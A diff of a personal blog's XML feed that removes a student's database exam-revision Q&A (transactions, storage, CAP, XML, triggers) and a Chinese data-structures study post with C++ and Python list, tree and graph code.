-<h3 id="What-is-a-serial-schedule-What-is-a-serialisable-schedule-Why-is-a-serial-schedule-considered-correct-Why-is-a-serialisable-schedule-considered-correct-（串行调度和可串行调度）">What is a serial schedule? What is a serialisable schedule? Why is a serial schedule considered correct? Why is a serialisable schedule considered correct?（串行调度和可串行调度）</h3>
-<ul>
-<li>A serial schedule is a type of schedule where one transaction is executed completely before starting another transaction. A serial schedule always gives the correct result. Consider two transactions <em>T</em>1 and <em>T</em>2 which perform some operations. If it has no interleaving of operations, then there are two possible outcomes: either execute all of <em>T</em>1 operations, which were followed by <em>T</em>2 operations.</li>
-<li>A serialisable schedule is a non-schedule serial that can be converted to its equivalent serial schedule. In other words, if a non-serial schedule and a serial schedule result in the same, then the non-serial schedule is called a serialisable schedule. A serialisable schedule is accepted as correct because the database is not influenced by the concurrent execution of the transactions.（数据库不受并发事务的影响）</li>
-</ul>
-<h3 id="Discuss-the-actions-taken-by-the-read-item-modify-item-and-write-item-operations-on-a-database">Discuss the actions taken by the <em>read_item</em>, <em>modify_item</em> and <em>write_item</em> operations on a database.</h3>
-<ul>
-<li>The <em>read item</em> operation reads a data item from storage to main memory. The <em>modify item</em> operation changes the value of item in the main memory. The <em>write item</em> operation writes the modified value from main memory to storage.</li>
-</ul>
-<h3 id="Define-the-violations-caused-by-each-of-the-following-a-dirty-read-and-b-phantoms-（脏读取和幻象）">Define the violations caused by each of the following: (a) dirty read, and (b) phantoms.（脏读取和幻象）</h3>
-<ul>
-<li>A dirty read occurs if one transaction reads data that has been modified by another transaction. [<strong>1 mark</strong>] This results in a violation of transaction isolation, if the transaction that modified the data is rolled back. [<strong>1 mark</strong>] A phantom read occurs when a transaction retrieves a set of rows twice [<strong>1 mark</strong>] and new rows are inserted or removed from that set by another transaction that is committed in between. [<strong>1 mark</strong>]</li>
-</ul>
-<h3 id="Describe-two-differences-between-primary-and-secondary-storage-（一次存储和二次存储）">Describe two differences between primary and secondary storage. （一次存储和二次存储）</h3>
-<ul>
-<li>Primary storage is the computer’s main memory and stores data temporarily. Secondary storage is external memory and saves data permanently. Data stored in primary storage can be directly accessed by the CPU, which cannot be accessed in secondary storage.</li>
-</ul>
-<h3 id="Explain-two-techniques-for-allocating-file-blocks-on-a-disk-in-detail-（磁盘分配文件块）">Explain two techniques for allocating file blocks on a disk in detail.（磁盘分配文件块）</h3>
-<ul>
-<li>contiguous file allocation and linked file allocation. （连续文件分配和链接文件分配）</li>
-<li>In contiguous file allocation, the block is allocated in such a manner that all the allocated blocks in the hard disk are adjacent. [<strong>1 mark</strong>] Assuming a file needs <em>n</em> number of blocks in the disk and the file begins with a block at position <em>x</em>, the next blocks to be assigned to it will be <em>x</em> + 1, <em>x</em> + 2, <em>x</em> + 3, …, <em>x</em> + <em>n</em>–1 so that they are in a contiguous manner.</li>
-<li>In linked file allocation, the file which we store on the hard disk is stored in a scattered manner according to the space available on the hard disk. [<strong>1 mark</strong>] To remember the blocks that belong to the same file, the linked file allocation technique uses pointers to point to the next block of the same file. [<strong>1 mark</strong>] Therefore, along with the entry of each file each block also stores the pointer to the next block.</li>
-</ul>
-<h3 id="Explain-how-double-buffering-improves-block-access-time-（双缓冲提高访问时间）">Explain how double buffering improves block access time. （双缓冲提高访问时间）</h3>
-<ul>
-<li>With double buffers, when the CPU is processing the current block of data in buffer 1 [<strong>1 mark</strong>], it can also retrieve the next block into buffer 2 at the same time. When processing of buffer 1 is done, the CPU can then move on to the next block in buffer 2 immediately without waiting.</li>
-</ul>
-<h3 id="What-is-label-security-How-does-an-administrator-enforce-it-（标签安全，管理员如何管理）">What is label security? How does an administrator enforce it?（标签安全，管理员如何管理）</h3>
-<ul>
-<li>Rows of data are labelled to indicate the level and nature of their sensitivity. A label on a row of data specifies the sensitivity of the information in the row and explicitly defines the criteria that must be met for a user to access that row.</li>
-<li>Create the label security policy container.（标签安全策略容器）</li>
-<li>Create data labels for the label security policy. （创建数据标签）</li>
-<li>Authorise users for the label security policy.（授权用户）</li>
-<li>Grant privileges to users and trusted stored program units.（给予权限）</li>
-</ul>
-<h3 id="What-is-flow-control-as-a-security-measure-What-types-of-flow-control-exists-（流量控制类型，作用）">What is flow control as a security measure? What types of flow control exists?（流量控制类型，作用）</h3>
-<ul>
-<li>Flow controls, most commonly, use a concept of security classes, where transmission of data is blocked if the receiver has a security level lower than the sender. There are two types of flow control:</li>
-<li>Explicit flows, consequences of assignments.（显示流量控制）</li>
-<li>Implicit flows, generated by conditions.（隐式流量控制）</li>
-</ul>
-<h3 id="Discuss-three-types-of-arrays-in-PHP-（php中的数组）">Discuss three types of arrays in PHP.（php中的数组）</h3>
-<ul>
-<li>An array in PHP is actually an ordered map. A map is a type that associates values to keys.    This type is optimised for several difference users; it can be treated as an array, a list, a hash table, a dictionary, etc. In PHP, the three types of arrays are: (a) indexed arrays, (b) associative arrays, and © multidimensional arrays. （索引数组，关联数组，多维数组）</li>
-<li>An indexed array is an array with a numeric key. It stores each array element with a numeric index.</li>
-<li>An associative array is an array where each key has its own specific value. The keys assigned to values can be arbitrary and user defined strings.</li>
-<li>A multidimensional array is an array containing one or more arrays within itself. Each element in the array can also be an array and each element in the sub-array can be an array or further contain array within itself.</li>
-</ul>
-<h3 id="What-are-PHP-auto-global-variables-（自动全局变量）">What are PHP auto-global-variables?（自动全局变量）</h3>
-<ul>
-<li>PHP auto-global-variables are built-in variables that are always available in all scopes.   Some predefined variables in PHP are super globals, which means that they are always accessible, regardless of scope, and you can access them from any function, class or file without having to do anything special.</li>
-</ul>
-<h3 id="What-is-the-CAP-theorem-Which-of-the-three-properties-consistency-availability-partition-tolerance-are-most-important-in-NoSQL-systems-（一致性，可用性和分区容错性）">What is the CAP theorem? Which of the three properties (consistency, availability, partition tolerance) are most important in NoSQL systems?（一致性，可用性和分区容错性）</h3>
-<ul>
-<li>In theoretical computer science, the CAP theorem states that any distributed data store can provide only two of the following three guarantees: consistency, availability, and partition tolerance. Consistency guarantees that every read receives the most recent write or an error. Availability guarantees that every request receives a non-error response, without the guarantee that it contains the most recent write. Partition tolerance guarantees that the system continues to operate despite an arbitrary number of messages being dropped or delayed by the network between nodes.</li>
-<li>In a networked NoSQL system, partition tolerance is a must. Network partitions and dropped or delayed messages are a fact in these networked shared-data systems and it must be handled appropriately. [<strong>1 mark</strong>] Consequently, system designers must choose between consistency and availability. A NoSQL system that prioritises availability over consistency can respond with possibly stale data. [<strong>1 mark</strong>] In contrast, a NoSQL system that prioritises consistency over availability can respond with the latest updated data. The system can be distributed across multiple servers and is designed to operate reliably even in the presence of network partitions. [<strong>1 mark</strong>] So, the partition tolerance and consistency properties are most important in NoSQL systems that require immediate consistency.</li>
-</ul>
-<h3 id="What-are-the-similarities-and-differences-between-consistency-in-CAP-versus-consistency-in-ACID">What are the similarities and differences between consistency in CAP versus consistency in ACID</h3>
-<h3 id="What-are-the-differences-between-structured-semi-structured-and-unstructured-data-（结构化数据和非结果化数据）">What are the differences between structured, semi-structured and unstructured data?（结构化数据和非结果化数据）</h3>
-<ul>
-<li>Structured data can be displayed in rows, columns and relational databases. Unstructured data cannot be displayed in rows, columns and relational databases.</li>
-<li>Structured data is comprised of numbers, dates and strings. Unstructured data is comprised of images, audio, video, word processing files, emails, spreadsheets, etc.</li>
-<li>In contrast to structured data, which requires less storage, unstructured data requires more storage. Also, it is more difficult to manage and protect unstructured data with legacy solutions.</li>
-<li>Semi-structured data is information that doesn’t consist of structured data but still has some structure to it. It includes key-value stores and graph databases.</li>
-</ul>
-<h3 id="What-are-the-differences-between-the-use-of-tags-in-XML-versus-HTML-（html和xml的标签区别）">What are the differences between the use of tags in XML versus HTML?（html和xml的标签区别）</h3>
-<ul>
-<li>XML provides namespaces support while HTML does not provide namespaces support. XML namespaces provide a method to avoid element name conflicts.</li>
-<li>In contrast to HTML tags, which are used for displaying data, XML tags are used for describing data not displaying it.</li>
-</ul>
-<h3 id="What-is-the-difference-between-XML-schema-and-XML-DTD-（xml模式和文档类型描述符）">What is the difference between XML schema and XML DTD? （xml模式和文档类型描述符）</h3>
-<ul>
-<li>DTD stands for Document Type Definition. [<strong>1 mark</strong>] A DTD defines the structure and the legal elements and attributes of an XML document. [<strong>1 mark</strong>] DTD is the predecessor of XML schema. [<strong>1 mark</strong>] While DTD provides the basic structure and grammar for defining a XML document, in addition to that XML schema provides methods to define constraints on the data contained in the document. [<strong>2 marks</strong>] Therefore, XML schema is considered to be richer and more powerful than DTD.</li>
-</ul>
-<h3 id="What-are-the-differences-between-row-level-and-statement-level-active-trigger-（行级触发器和语句触发器）">What are the differences between row-level and statement-level active trigger?（行级触发器和语句触发器）</h3>
-<ul>
-<li>Row level triggers execute once for each and every row in the transaction. In contrast, statement level triggers execute only once for each single transaction.</li>
-<li>Row level triggers are specifically used for data handling purposes. In contrast, statement level trigger are used for enforcing all additional security on the transactions performed on the table.</li>
-<li>For example, if 200 rows are to be inserted into a table, the row level trigger would execute 200 times. In contrast, if 200 rows are to be inserted into a table, a statement level trigger would only execute once.</li>
-</ul>
-<h3 id="How-does-clustering-differ-from-classification-（聚类和分类）">How does clustering differ from classification?（聚类和分类）</h3>
-<ul>
-<li>Classification is a supervised machine learning approach where a specific label is provided to the machine learning model to classify new observations. In contrast to classification, clustering is an unsupervised machine learning approach where no specific labels are available in the dataset and grouping is performed on similarities basis.</li>
-</ul>
-<h3 id="What-are-the-difficulties-of-mining-association-rules-from-large-databases-（从大型数据库挖掘关联规则）">What are the difficulties of mining association rules from large databases?（从大型数据库挖掘关联规则）</h3>
-<ul>
-<li>Mining of association rules in large databases is a challenging task. An Apriori algorithm is widely used to find out the frequent itemsets from the database. [<strong>1 mark</strong>] However, it will be inefficient on large databases because it will require more I/O load. Another disadvantage of association rule mining is that they can produce boring rules [<strong>1 mark</strong>], have many discovered rules [<strong>1 mark</strong>], and perform poorly. [<strong>1 mark</strong>]</li>
-</ul>
-]]></content>
-      <categories>
-        <category>大二课程</category>
-      </categories>
-      <tags>
-        <tag>复习</tag>
-        <tag>校内课程</tag>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>寒假算法练习01</title>
     <url>/2023/01/23/%E5%AF%92%E5%81%87%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A001/</url>
     <content><![CDATA[<p>csoj练习题目第一天。</p>
@@ -1705,8 +1733,8 @@ SELECT , INSERT , UPDATE , DELETE</p>
         <category>算法</category>
       </categories>
       <tags>
-        <tag>C++</tag>
         <tag>算法</tag>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -1737,95 +1765,6 @@ SELECT , INSERT , UPDATE , DELETE</p>
       </categories>
       <tags>
         <tag>开发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据结构复习</title>
-    <url>/2023/02/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<h1>前言</h1>
-<p>写这篇文章的目的呢，主要是当做笔记了，现在都已经大二了数据结构与算法还是比较薄弱，感觉都不能叫菜了(哭，所以就写一篇相当于知识体系的博客吧，内容非常的基础，没什么亮点，<s>也没什么看的价值</s>。</p>
-<p>首先我们理一理这个数据结构，从大一开始我们就知道什么栈啊表啊什么的，那在这我们做一个简单的总结吧，简单数据结构首先可以分为表栈队树图，当然我知道这么分很垃，但是总体上大概可以看成这几类，那我们就一种一种来看。</p>
-<h1>表</h1>
-<p>首先看表，表这种数据结构很直观，先进先出，也很好理解，这里就记录一下各种不同的表以及实现方式。</p>
-<h2 id="顺序表">顺序表</h2>
-<p>首先我们先分配出一个数据结构</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  Maxsize 100  <span class="comment">//最大空间</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;<span class="comment">//typedef的作用是把这个结构体等价于类型名SqList</span></span><br><span class="line">	ElemType *elem;<span class="comment">//自定义数据类型，动态分配方式</span></span><br><span class="line"><span class="comment">//  ElemType data[Maxsize]//静态分配方式  </span></span><br><span class="line">	<span class="type">int</span> length; <span class="comment">// 顺序表的长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
-<p>顺序表的存储方式如下，它的特点是只要索引正确，可以<strong>立即找到相对应的数值</strong>，对比有指针的那位…另外，第i个元素的值为L,elem[i-1]，这个细节留意一下。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span> <span class="comment">//构造一个空的顺序表L</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效</span></span><br><span class="line"><span class="comment">//不加&amp;内部改变，跳出函数后无效</span></span><br><span class="line">    L.elem=<span class="keyword">new</span> <span class="type">int</span>[Maxsize];    <span class="comment">//为顺序表分配Maxsize个空间</span></span><br><span class="line">    <span class="keyword">if</span>(!L.elem) <span class="keyword">return</span> <span class="literal">false</span>;      <span class="comment">//存储分配失败</span></span><br><span class="line">    L.length=<span class="number">0</span>;				<span class="comment">//空表长度为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,size</span>):  <span class="comment"># initialization</span></span><br><span class="line">    self.<span class="built_in">max</span>=size        <span class="comment">#表的最大值</span></span><br><span class="line">    self.data=[<span class="literal">None</span>]*self.<span class="built_in">max</span> <span class="comment">#表的值</span></span><br><span class="line">    self.num=<span class="number">0</span>  <span class="comment">#当前该顺序表的长度，空表为0</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2022/11/09/zmNZ9QCjiFqcWXU.png" alt="image-20221108223419456.png"></p>
-<h3 id="插，删，找">插，删，找</h3>
-<p>任何一个数据结构都会具备基本的增删改查功能，取值和查找基本相同就不赘述了，这里讲讲插入和删除，首先在顺序表中第<em>i</em>个位置之前插入一个元素<em>e</em>，需要从最后一个元素开始，后移一位，…，直到把第<em>i</em>个元素也后移一位，然后把<em>e</em>放入第<em>i</em>个位置。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	<span class="keyword">if</span>(L.length==Maxsize) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//存储空间已满</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--)</span><br><span class="line">	    L.elem[j+<span class="number">1</span>]=L.elem[j];   <span class="comment">//从最后一个元素开始后移，直到第i个元素后移</span></span><br><span class="line">	L.elem[i<span class="number">-1</span>]=e;              <span class="comment">//将新元素e放入第i个位置</span></span><br><span class="line">	L.length++;		     	<span class="comment">//表长增1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">addnum</span>(<span class="params">self,value,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span>-<span class="number">1</span> <span class="keyword">or</span> index&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    i=self.num</span><br><span class="line">    <span class="keyword">while</span> i&gt;=index:</span><br><span class="line">        self.data[i]=self.data[i-<span class="number">1</span>]</span><br><span class="line">        i-=<span class="number">1</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=value</span><br></pre></td></tr></table></figure>
-<p>而在顺序表中删除第<em>i</em>个元素，需要把该元素暂存到变量<em>e</em>，然后从<em>i</em>+1个元素开始前移，…，直到把第<em>n</em>个元素也前移一位，即可完成删除操作。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete_Sq</span><span class="params">(SqList &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((i&lt;<span class="number">1</span>)||(i&gt;L.length)) <span class="keyword">return</span> <span class="literal">false</span>;	 <span class="comment">//i值不合法</span></span><br><span class="line">	e=L.elem[i<span class="number">-1</span>];   <span class="comment">//将欲删除的元素保留在e中</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j=i;j&lt;=L.length<span class="number">-1</span>;j++)</span><br><span class="line">		L.elem[j<span class="number">-1</span>]=L.elem[j]; <span class="comment">//被删除元素之后的元素前移</span></span><br><span class="line">	L.length--; <span class="comment">//表长减1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deletenum</span>(<span class="params">self,index</span>):</span><br><span class="line">    <span class="keyword">if</span> index&gt;self.<span class="built_in">max</span> <span class="keyword">or</span> index&lt;<span class="number">1</span>:<span class="comment">#判断是否合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    self.data[index-<span class="number">1</span>]=<span class="literal">None</span> <span class="comment">#删除元素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index,self.<span class="built_in">max</span>):<span class="comment"># 依次移动</span></span><br><span class="line">        self.data[i-<span class="number">1</span>]=self.data[i]</span><br><span class="line">    self.data[self.num]=<span class="literal">None</span> <span class="comment">#最后一个数字要变为None</span></span><br></pre></td></tr></table></figure>
-<h2 id="链表">链表</h2>
-<p>链表呢就是有指针的表了，它像链条一样链接起各个元素，特点是插入和删除数据十分方便，但是寻找和读取数据能力欠佳。</p>
-<h3 id="单链表">单链表</h3>
-<p>单链表的图示图下：</p>
-<p><img src="https://s2.loli.net/2022/11/09/68OkI9CQHpL1B4t.png" alt="image2.png"></p>
-<p>每一个单独结构可以分成两部分，数据部分和指针部分（也有表达为数据域和指针域的），</p>
-<p>首先定义结构以及初始化，初始化的步骤呢就是先无中生有一个头节点，将他的指针域指向空即可。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Lnode</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> data; <span class="comment">//结点的数据域</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">LNode</span> *next; <span class="comment">//结点的指针域</span></span><br><span class="line">&#125;Lnode, *Linklist<span class="comment">//LinkList为指向结构体LNode的指针类型</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">InitList_L</span><span class="params">(LinkList &amp;L)</span><span class="comment">//构造一个空的单链表L</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=<span class="keyword">new</span> LNode;     <span class="comment">//生成新结点作为头结点，用头指针L指向头结点</span></span><br><span class="line">	<span class="keyword">if</span>(!L)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//生成结点失败</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;   <span class="comment">//头结点的指针域置空</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="创建单链表">创建单链表</h4>
-<p>修改指针的顺序原则：先修改没有指针标记的那一端。</p>
-<h5 id="头（前）插法">头（前）插法</h5>
-<p>这个呢代表着新的结构体是从头节点后面插入的，且每次插入都是从头节点插入，所以依次插入之后呢，结果会和插入的顺序相反，比如输入的序列是：1，2，3，4，那么实际生成的单链表是4-&gt;3-&gt;2-&gt;1。这里注意头节点是没有数据的噢~</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_H</span><span class="params">(LinkList &amp;L)</span><span class="comment">//前插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s; <span class="comment">//定义一个指针变量</span></span><br><span class="line">	L=<span class="keyword">new</span> LNode;<span class="comment">//新建头节点</span></span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	cin&gt;&gt;n;<span class="comment">//n表示元素数量</span></span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode; <span class="comment">//生成新结点s</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=L-&gt;next;<span class="comment">//先修改没有标记的一端（指没有头指针标记）</span></span><br><span class="line">		L-&gt;next=s; <span class="comment">//将新结点s插入到头结点之后</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h5 id="尾插法">尾插法</h5>
-<p>尾插法就是指每次插入都从最后一个结构后面插入，插入完毕后修改尾指针指向。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateList_R</span><span class="params">(LinkList &amp;L)</span><span class="comment">//尾插法创建单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	LinkList s, r;</span><br><span class="line">	L=<span class="keyword">new</span> LNode;</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的空链表</span></span><br><span class="line">	r=L; <span class="comment">//尾指针r指向头结点</span></span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">		s=<span class="keyword">new</span> LNode;<span class="comment">//生成新结点</span></span><br><span class="line">		cin&gt;&gt;s-&gt;data; <span class="comment">//输入元素值赋给新结点的数据域</span></span><br><span class="line">		s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		r-&gt;next=s;<span class="comment">//将新结点s插入尾结点*r之后</span></span><br><span class="line">		r=s;<span class="comment">//r指向新的尾结点s</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="取值，查找">取值，查找</h4>
-<p>单链表的取值不可以像顺序表一样直接找到任意一个元素，它只能从第一个节点开始往后依次找，一直找到第n个节点。而查找的话，可以定义一个p指针指向第一个元素节点并比较节点的数据域是否等于value。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem_L</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span><span class="comment">//单链表的取值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//在带头结点的单链表L中查找第i个元素</span></span><br><span class="line">	<span class="comment">//用e记录L中第i个数据元素的值</span></span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	LinkList p;</span><br><span class="line">	p=L-&gt;next;<span class="comment">//p指向第一个结点，</span></span><br><span class="line">	j=<span class="number">1</span>; <span class="comment">//j为计数器</span></span><br><span class="line">	<span class="keyword">while</span>(j&lt;i&amp;&amp;p) <span class="comment">//顺链域向后扫描，直到p指向第i个元素或p为空</span></span><br><span class="line">    &#123;</span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">		j++; <span class="comment">//计数器j相应加1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!p||j&gt;i)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//i值不合法i＞n或i&lt;=0</span></span><br><span class="line">	e=p-&gt;data; <span class="comment">//取第i个结点的数据域</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LocateElem_L</span><span class="params">(LinkList L, <span class="type">int</span> e)</span> <span class="comment">//按值查找</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LinkList p;	<span class="comment">//在带头结点的单链表L中查找值为e的元素</span></span><br><span class="line">	p=L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p&amp;&amp;p-&gt;data!=e)<span class="comment">//顺链域向后扫描，直到p为空或p所指结点的数据域等于e</span></span><br><span class="line">		p=p-&gt;next; <span class="comment">//p指向下一个结点</span></span><br><span class="line">	<span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//查找失败p为NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="树">树</h2>
-<h3 id="二叉树，树，森林间的转换">二叉树，树，森林间的转换</h3>
-<h4 id="树转二叉树">树转二叉树</h4>
-<ol>
-<li>树所有相邻兄弟节点之间加虚线</li>
-<li>树中每个节点只保留与长子（左孩子）的连线，删除与其他孩子的连线</li>
-<li>以跟节点为轴心，整棵树顺时针转45°。</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/1b4cd5a818385c47.png" alt=""></p>
-<h4 id="森林转二叉树">森林转二叉树</h4>
-<ol>
-<li>每棵树转二叉树</li>
-<li>第一棵二叉树不动，第二棵树开始，依次把后一棵二叉树的根节点作为前一棵二叉树根节点的右孩子节点，直到所有二叉树连接在一起</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/56dc9fc36f73271b.png" alt=""></p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/d81d04d2f23d3cae.png" alt=""></p>
-<h4 id="二叉树还原成树">二叉树还原成树</h4>
-<ol>
-<li>若某结点是其双亲的左孩子，则把该结点的右孩子、右孩子的右孩子等都与该结点的双亲结点用连线连起来</li>
-<li>删除原二叉树中所有双亲结点与右孩子结点之间的连线</li>
-<li>整理</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/a44f2b8ca00935fb.png" alt=""></p>
-<h4 id="二叉树还原成森林">二叉树还原成森林</h4>
-<ol>
-<li>切开根节点右链上所有“双亲-右孩子”的关系，分为若干二叉树</li>
-<li>将这些二叉树还原为树</li>
-</ol>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/8b51253149316860.png" alt=""></p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/19/3753eb66fcb5d9b4.png" alt=""></p>
-<h2 id="图">图</h2>
-<p>图分为节点结构和图结构，节点结构包括一条边的起点，终点和边的权重，图结构包括整个图的边数，节点数以及节点的集合。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">	<span class="type">char</span> a,b;<span class="comment">//起点和终点</span></span><br><span class="line">	<span class="type">int</span> w;<span class="comment">//权</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> len,n;<span class="comment">//长度和顶点个数</span></span><br><span class="line">	Node *list;<span class="comment">//节点集合</span></span><br><span class="line">&#125;Graph;</span><br></pre></td></tr></table></figure>
-<h3 id="初始化和构建图">初始化和构建图</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">initList</span><span class="params">(Graph &amp;G)</span></span>&#123;</span><br><span class="line">	G.len=<span class="number">0</span>;</span><br><span class="line">	G.list=<span class="keyword">new</span> Node[MAX];</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetList</span><span class="params">(Graph &amp;G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cin&gt;&gt;G.len&gt;&gt;G.n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.n;i++)</span><br><span class="line">		cin&gt;&gt;node[i];<span class="comment">//这一步是输入节点名称，需全局定义一个字符数组。</span></span><br><span class="line">	G.list[<span class="number">0</span>].w=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.len;i++)</span><br><span class="line">		cin&gt;&gt;G.list[i].a&gt;&gt;G.list[i].b&gt;&gt;G.list[i].w;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>到这里一个完整的图就构建完毕了，关于图的算法有挺多，仍在摸索ing…</p>
-<p>参考文章：文中部分图片出自：<a href="https://blog.csdn.net/kindoms214/article/details/85699598">https://blog.csdn.net/kindoms214/article/details/85699598</a></p>
-<p>标记：持续施工中…</p>
-]]></content>
-      <categories>
